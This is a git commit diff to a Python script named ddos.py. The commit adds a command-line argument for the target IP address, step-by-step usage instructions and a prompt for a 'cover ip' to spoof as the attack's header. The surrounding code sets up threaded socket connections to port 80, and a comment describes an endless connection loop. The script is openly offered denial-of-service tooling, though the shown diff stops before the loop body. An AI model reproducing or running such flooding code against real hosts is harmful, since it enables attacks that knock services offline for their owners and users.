90da2ab0be70b5b5c882ec74c22d3cc54e70163a
yensama7 <uzonuemerie@gmail.com>
2024-04-30 07:58:44 +0100

    added argparser to get the ip address

--- DDOS/ddos.py
+++ DDOS/ddos.py
@@ -1,9 +1,28 @@
+# How to use
+#Enter the directory DDOS
+#Run the command in the terminal py ddos.py -i (the desired ip address)
+#Example : py ddos.py -i 192.168.70.235
+#click enter
+
 import socket
 import threading
+import argparse
 
-target = '192.168.70.234' # could be the ip address of your router or domain name of a wabsite
+if __name__ == "__main__":
+
+    parser = argparse.ArgumentParser(
+        description="To input the ip address and fake ip"
+    )
+
+    parser.add_argument(
+        '-i', '--ip', metavar='Ip',
+        required = True, help = 'add the the ip address to the code with -i '
+    )
+    argu = parser.parse_args()
+    
+target = f'{argu.ip}' # could be the ip address of your router or domain name of a wabsite
 port = 80 # The port matters in the DDOS, 80 is used in http attack
-fake_ip = '182.21.20.32' # Stays as the header of the attack
+fake_ip = input('Input a cover ip: ')# (fake ip) Stays as the header of the attack
 
 def attack():
     # Endless loop opening socket connection
